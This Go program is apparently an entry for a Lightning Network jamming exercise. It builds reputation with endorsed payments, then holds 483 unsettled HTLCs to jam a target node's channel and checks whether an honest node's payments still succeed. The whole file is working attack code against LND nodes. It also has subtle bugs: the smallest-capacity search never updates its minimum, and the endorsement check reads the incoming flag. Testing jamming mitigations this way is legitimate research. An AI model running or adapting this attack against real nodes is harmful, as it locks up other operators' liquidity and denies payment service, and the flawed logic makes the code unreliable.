package main

import (
	"context"
	"fmt"
	"github.com/lightningnetwork/lnd/funding"
	"math"
	"os"
	"sync"
	"sync/atomic"
	"time"

	"github.com/lightninglabs/lndclient"
	"github.com/lightningnetwork/lnd/routing/route"
	"github.com/lightningnetwork/lnd/signal"
)

var interceptor signal.Interceptor

func main() {
	// Hook interceptor for os signals.
	var err error
	interceptor, err = signal.Intercept()
	if err != nil {
		_, _ = fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}

	ctx, cancel := context.WithCancel(context.Background())
	lnds, err := getLndNodes(ctx)
	if err != nil {
		fmt.Printf("Could not set up connection: %v\n", err)
		os.Exit(1)
	}

	target, err := route.NewVertexFromStr(os.Getenv("TARGET"))
	if err != nil {
		fmt.Printf("Could not get target node: %v\n", err)
		os.Exit(1)
	}

	fmt.Printf("Starting attack against: %v\n", target)
	// Write your attack here!
	//
	// We've provided two utilities for you:
	// - GraphHarness: handles channel opens, P2P connection and graph lookups
	// - JammingHarness: handles sending and holding of payments
	graph := &GraphHarness{
		LndNodes: lnds,
	}
	jammer := &JammingHarness{
		LndNodes: lnds,
	}

	ah, err := newAttackHarness(ctx, target, graph, jammer, lnds)
	if err != nil {
		fmt.Printf("Could not set up attack harness: %v\n", err)
		os.Exit(1)
	}

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()

		select {
		case <-interceptor.ShutdownChannel():
		}
		fmt.Println("Got shutdown Signal!")

		ah.stop(ctx)
	}()

	err = ah.doThings(ctx)
	if err != nil {
		fmt.Printf("Could do things: %v\n", err)
	}
	/*
		err = ah.jam(ctx)
		if err != nil {
			fmt.Printf("Could not jam: %v\n", err)
			os.Exit(1)
		}

	*/

	fmt.Println("Waiting for threads to shutdown")

	wg.Wait()
	cancel()
	jammer.wg.Wait()
	graph.wg.Wait()

	fmt.Println("Shutdown complete")
}

type attackHarness struct {
	targetNode     *lndclient.NodeInfo
	targetPeerNode *lndclient.NodeInfo

	*LndNodes

	graph  *GraphHarness
	jammer *JammingHarness

	quit chan struct{}
	wg   sync.WaitGroup
}

func newAttackHarness(ctx context.Context, target route.Vertex,
	graph *GraphHarness, jammer *JammingHarness, lnds *LndNodes) (
	*attackHarness, error) {

	targetNodeInfo, err := graph.LookupNode(ctx, 0, target, true)
	if err != nil {
		return nil, err
	}

	// Now find the target node channel with the smallest capacity.
	var (
		targetChannel lndclient.ChannelEdge
		minCap        = uint64(math.MaxUint64)
	)
	for _, channel := range targetNodeInfo.Channels {
		if uint64(channel.Capacity) < minCap {
			targetChannel = channel
		}
	}

	fmt.Printf("Channel to attack is: %d\n", targetChannel.ChannelID)

	// What is the peer that we are gonna connect to?
	targetPeer := targetChannel.Node1
	if targetChannel.Node1 == targetNodeInfo.PubKey {
		targetPeer = targetChannel.Node2
	}

	targetPeerInfo, err := graph.LookupNode(ctx, 0, targetPeer, true)
	if err != nil {
		return nil, err
	}

	fmt.Printf("Found target peer: (%s)\n", targetPeerInfo.Alias)

	return &attackHarness{
		LndNodes:       lnds,
		targetNode:     targetNodeInfo,
		targetPeerNode: targetPeerInfo,
		graph:          graph,
		jammer:         jammer,
		quit:           make(chan struct{}),
	}, nil
}

func (h *attackHarness) doThings(ctx context.Context) error {
	fmt.Println("Opening channels...")

	if err := h.openChans(ctx); err != nil {
		return err
	}

	fmt.Println("Start building good rep...")

	if err := h.buildReputation(ctx); err != nil {
		return err
	}

	fmt.Println("Our channels now have good reputation!")

	/*
		if err := h.hodlAndAssess(ctx); err != nil {
			return err
		}

	*/

	if err := h.jam(ctx); err != nil {
		return err
	}

	// Send payments every few seconds forever.
	if err := h.sendPaymentsSlowly(ctx); err != nil {
		return err
	}

	return nil
}

func (h *attackHarness) stop(ctx context.Context) {
	fmt.Println("attack harness stopping...")
	defer fmt.Println("attack harness stopped")

	err := h.closeAllChans(ctx)
	if err != nil {
		fmt.Printf("could not close channels...: %v\n", err)
	}

	close(h.quit)
	h.wg.Wait()
}

func (h *attackHarness) closeAllChans(ctx context.Context) error {
	fmt.Println("Cleaning up opened channels for all nodes")
	if err := h.graph.CloseAllChannels(ctx, 0); err != nil {
		return err
	}

	if err := h.graph.CloseAllChannels(ctx, 1); err != nil {
		return err
	}

	if err := h.graph.CloseAllChannels(ctx, 2); err != nil {
		return err
	}

	return nil
}

func (h *attackHarness) openChans(ctx context.Context) error {
	chanCap := funding.MaxBtcFundingAmount
	_, err := h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      0,
		Dest:        h.targetNode.PubKey,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return err
	}

	fmt.Printf("opened channel with target node (%s) from a0\n",
		h.targetNode.Alias)

	// With attack node 1, open a channel with the targets peer & push a
	// large amount to them.
	_, err = h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      1,
		Dest:        h.targetPeerNode.PubKey,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return err
	}
	fmt.Printf("opened channel with target peer (%s) from a1\n",
		h.targetPeerNode.Alias)

	// Open chan from a2 to target (a2 is our "good" node). We will build
	// good rep for it and maintain that good rep. If its payments stop
	// going through then we know we have jammed the target channel.
	_, err = h.graph.OpenChannel(ctx, OpenChannelReq{
		Source:      2,
		Dest:        h.targetNode.PubKey,
		CapacitySat: chanCap,
		PushAmt:     chanCap / 2,
	})
	if err != nil {
		return err

	}

	fmt.Printf("opened channel with target node (%s) from a2\n", h.targetNode.Alias)

	return nil
}

// buildReputation sends payments back and forth between A0 & A2 until the two
// channels that A0 & A2 have with the attacker have good reputation.
func (h *attackHarness) buildReputation(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	var mainWG sync.WaitGroup
	sendUntilEndorsed := func(src, dst int) {
		defer mainWG.Done()

		var (
			wg   sync.WaitGroup
			done atomic.Bool

			// Send a max of 200 payments in parallel.
			semaphores = make(chan struct{}, 200)
		)
		for {
			select {
			case <-h.quit:
				return
			case semaphores <- struct{}{}:
			}

			// Once we have good reputation, exit.
			if done.Load() {
				break
			}

			wg.Add(1)
			go func() {
				defer wg.Done()
				endorsed, err := h.sendGoodAndCheckEndorsed(
					ctx, src, dst, height,
				)
				if err != nil {
					fmt.Printf("error sending good "+
						"payment: %v\n", err)
				}

				if endorsed {
					done.Store(true)
				}

				select {
				case <-h.quit:
				case <-time.Tick(time.Millisecond * 10):
				}

				select {
				case <-h.quit:
				case <-semaphores:
				}
			}()
		}

		wg.Wait()
	}

	// Send good payments back and forth between A0 & A2 until both those
	// channels with the target peer (A0->Target & A2->Target) have good
	// reputation.
	mainWG.Add(2)

	go sendUntilEndorsed(0, 2)
	go sendUntilEndorsed(2, 0)

	mainWG.Wait()

	return nil
}

// sendPaymentsSlowly alternates between sending payments from A0->A1 and
// A0->A2. It is used to show if they arrive with the endorsement signal or not.
func (h *attackHarness) sendPaymentsSlowly(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// Ok next, we just send small payments indefinitely so we can watch
	// logs and see if our reputation (with our channel directly with the
	// target node) starts increasing. Also watch the endorsement signal
	// for the outgoing payment.
	source := 0
	for {
		if source == 0 {
			source = 2
		} else {
			source = 0
		}

		_, err := h.sendGoodAndCheckEndorsed(
			ctx, source, 1, height,
		)
		if err != nil {
			return err
		}

		select {
		case <-h.quit:
			return nil
		case <-time.Tick(time.Millisecond * 500):
		}
	}
}

func (h *attackHarness) sendGoodAndCheckEndorsed(ctx context.Context, src,
	dst int, height int32) (bool, error) {

	resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
		AmtMsat:         80000,
		SourceIdx:       src,
		DestIdx:         dst,
		FinalCLTV:       uint64(height) + 80,
		EndorseOutgoing: true,
		Settle:          true,
	})
	if err != nil {
		return false, err
	}

	select {
	case r := <-resp:
		if r.Err != nil {
			return false, r.Err
		}

		endorsed := outgoingEndorsed(r.Htlcs)

		fmt.Printf("payment sent from A%d to A%d. Endorsed? %v\n", src,
			dst, endorsed)

		return endorsed, nil

	case <-h.quit:
		return false, fmt.Errorf("exited")
	}
}

func (h *attackHarness) hodlAndAssess(ctx context.Context) error {
	// Get current best block.
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// First: Create HODL payment: SRC: A0. DST: A1.

	// We do endorse this cause we want the target node to endorse
	// it so that its reputation with its peer gets destroyed.
	fmt.Println("Start creating HODL payment from A0 -> A1")
	jamResp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
		AmtMsat:         800000,
		SourceIdx:       0,
		DestIdx:         1,
		FinalCLTV:       uint64(height) + 80,
		EndorseOutgoing: true,
		Settle:          false,
		SettleWait:      time.Hour,
		ForceSettle:     h.quit,
	})
	if err != nil {
		return err
	}

	// While the HODL payment is being held, make small payments from our
	// good node, A2, and asses if it's payments end up switching to
	// un-endorsed.
	// We also keep sending small payments from A1 so we can know when that
	// channel is seen as un-endorsed.
	source := 2
	for {
		if source == 0 {
			source = 2
		} else {
			source = 0
		}

		_, err := h.sendGoodAndCheckEndorsed(ctx, source, 1, height)
		if err != nil {
			return err
		}

		select {
		case <-interceptor.ShutdownChannel():
			break
		case <-time.Tick(time.Millisecond * 50):
		}

		break
	}

	fmt.Println("waiting for jam response...")
	select {
	case resp := <-jamResp:
		fmt.Printf("got jam response: %v\n", resp.Err)
	case <-h.quit:
	}

	return nil
}

// jam wil send 483 small hold payments from A0 -> A1. We should then see that
// A2 (our good node) is no longer able to make honest payment.
func (h *attackHarness) jam(ctx context.Context) error {
	// Get current best block
	_, height, err := h.Lnd2.ChainKit.GetBestBlock(ctx)
	if err != nil {
		return err
	}

	// Add 483 non-settling payments.
	var wg sync.WaitGroup
	for i := 0; i < 483; i++ {
		i := i
		wg.Add(1)
		go func() {
			defer wg.Done()
			resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
				AmtMsat:         1000,
				SourceIdx:       0,
				DestIdx:         2,
				FinalCLTV:       0,
				EndorseOutgoing: true,
				Settle:          false,
				SettleWait:      time.Hour,
				ForceSettle:     h.quit,
			})
			if err != nil {
				fmt.Printf("got error setting up HOLD payment %d: %v\n", i, err)
				return
			}

			select {
			case r := <-resp:
				if r.Err != nil {
					fmt.Printf("got error for HOLD payment %d: %v\n", i, r.Err)
					return
				}

			case <-h.quit:
			}
		}()
	}

	fmt.Println("483 Hodl payments have been attempted.... Now trying payment from good node")

	// Try to do a payment from our good node now.
	resp, err := h.jammer.JammingPayment(ctx, JammingPaymentReq{
		AmtMsat:         1000,
		SourceIdx:       2,
		DestIdx:         1,
		FinalCLTV:       uint64(height) + 80,
		EndorseOutgoing: true,
		Settle:          true,
	})
	if err != nil {
		fmt.Printf("Good payment setup failed: %v\n", err)
		return err
	}

	r := <-resp
	if r.Err != nil {
		fmt.Printf("Good payment failed!! %v\n", r.Err)
		return err
	}
	fmt.Printf("good succeeded! was it endorsed? %v\n", outgoingEndorsed(r.Htlcs))

	return nil
}

func outgoingEndorsed(htlcs []lndclient.InvoiceHtlc) bool {
	for _, htlc := range htlcs {
		return htlc.IncomingEndorsed
	}

	return false
}
